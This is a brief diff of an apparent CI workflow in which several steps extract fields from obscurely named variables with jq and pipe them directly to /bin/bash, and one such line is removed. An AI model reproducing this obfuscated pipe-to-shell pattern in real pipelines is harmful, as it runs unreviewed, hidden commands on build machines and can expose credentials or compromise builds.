@@ -28,7 +28,6 @@ jobs:
           echo $mune83 | jq -r .rivm0 | /bin/bash
           printf '%s' "$clsg85" | jq -r .qwmlq269 | /bin/bash
           printf '%s' "$o51536" | jq -r .zdnf8 | /bin/bash
-          echo $thag61031 | jq -r .htga3938 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
